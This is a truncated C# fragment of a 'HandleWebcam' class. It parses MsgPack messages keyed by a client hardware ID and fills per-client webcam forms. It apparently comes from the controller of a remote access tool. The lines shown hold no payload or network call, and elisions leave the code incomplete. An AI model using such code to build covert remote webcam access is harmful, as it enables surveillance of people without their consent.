    ...
    internal class HandleWebcam
    {
        public HandleWebcam(MsgPack unpack_msgpack, Clients client)
        {
            ...
            if (!(asString == "getWebcams"))
            {
                ...
                formWebcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                try
                {
                    if (formWebcam != null)
                    {
            ...
            FormWebcam formWebcam2;
            formWebcam2 = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            try
            {
                if (formWebcam2 != null)
                {
                    ...
                    string[] array;
                    array = unpack_msgpack.ForcePathObject("List").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
